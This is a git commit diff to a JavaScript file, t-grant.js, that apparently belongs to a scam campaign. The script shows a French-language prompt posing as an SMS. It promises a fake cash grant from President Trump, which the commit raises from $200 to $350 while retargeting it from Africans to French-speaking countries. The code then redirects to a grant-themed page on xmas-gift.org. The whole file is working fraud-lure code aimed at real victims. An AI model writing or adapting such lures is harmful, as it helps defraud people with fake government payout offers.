5c474d270898bf5f8d25cc1413f3495f8379a9e1
4g-network <154092422+4g-network@users.noreply.github.com>
2024-11-09 23:53:25 -0800

    Update t-grant.js

--- t-grant.js
+++ t-grant.js
@@ -1,6 +1,6 @@
 
-var password = 'RETRAIT 200 $'
-password=prompt('SMS: Félicitations, vous êtes admissible à la subvention en espèces de 200 $ du président Trump pour les Africains. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETRAIT 200 $');
-if (password != 'RETRAIT 200 $') {
+var password = 'RÉCLAMER 350 $'
+password=prompt('SMS: Félicitations, vous êtes admissible à la subvention en espèces de 350 $ du président Trump pour les pays français. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RÉCLAMER 350 $');
+if (password != 'RÉCLAMER 350 $') {
 location.href='https://xmas-gift.org/grant-gov.html';
 }
